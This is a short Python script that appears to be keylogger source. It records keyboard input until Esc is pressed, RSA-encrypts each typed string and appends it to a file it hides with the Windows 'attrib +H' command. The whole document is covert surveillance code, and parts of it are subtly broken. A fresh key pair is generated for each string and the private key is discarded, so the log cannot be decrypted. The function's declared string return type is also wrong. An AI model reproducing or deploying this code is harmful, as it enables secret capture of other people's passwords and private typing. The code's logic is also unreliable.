import keyboard
import subprocess
import rsa

def encrypt(message: str) -> str:
    (pubkey, privkey) = rsa.newkeys(512)
    encrypted = rsa.encrypt(message.encode('utf8'), pubkey)
    return encrypted

def create_file():
    f = open("out.txt", "x")
    subprocess.check_call(["attrib","+H","out.txt"])
    f.close()

def log_keys():
    try:
        recorded_keys = keyboard.record('Esc')
        string_ver = keyboard.get_typed_strings(recorded_keys)
        f = open("./out.txt", "ab")
        for i in string_ver:
            f.write(encrypt(i))
        f.close()

    except IOError:
        create_file()

log_keys()
